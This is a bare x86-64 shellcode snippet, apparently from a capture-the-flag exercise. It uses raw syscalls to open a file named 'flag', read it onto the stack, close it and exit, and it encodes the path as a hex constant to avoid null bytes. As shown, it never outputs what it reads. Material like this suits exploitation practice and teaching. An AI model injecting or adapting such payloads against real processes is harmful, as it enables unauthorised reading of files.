; open(".///flag", 0, 0)
xor rax, rax
push rax
inc rax
inc rax
mov r8, 0x67616c662f2f2f2e
push r8
mov rdi, rsp
xor rsi, rsi
xor rdx,rdx
syscall

; read(fd, $rsp, 0xff)
mov r8, rax
mov rdi, rax
xor rax, rax
mov rsi, rsp
mov dl, 0xff
syscall

; close(fd)
mov rdi, r8
xor rax, rax
mov al, 0x3
syscall

; exit(0)
xor rax, rax
mov al, 0x3c
xor rdi, rdi
syscall
